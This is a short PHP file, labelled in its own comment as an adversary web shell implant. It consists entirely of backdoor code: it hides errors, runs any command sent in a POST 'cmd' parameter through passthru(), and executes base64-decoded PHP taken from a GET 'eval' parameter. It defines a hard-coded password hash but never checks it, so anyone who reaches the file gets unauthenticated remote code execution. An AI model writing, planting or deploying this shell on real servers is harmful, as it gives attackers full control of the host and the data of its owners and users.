<?php
// Cyber Adversary Web Shell Implant
@ini_set('display_errors', '0');
$auth_pass = "21232f297a57a5a743894a0e4a801fc3";
if (isset($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    passthru($cmd);
    exit;
}
if (isset($_GET['eval'])) {
    eval(base64_decode($_GET['eval']));
}
?>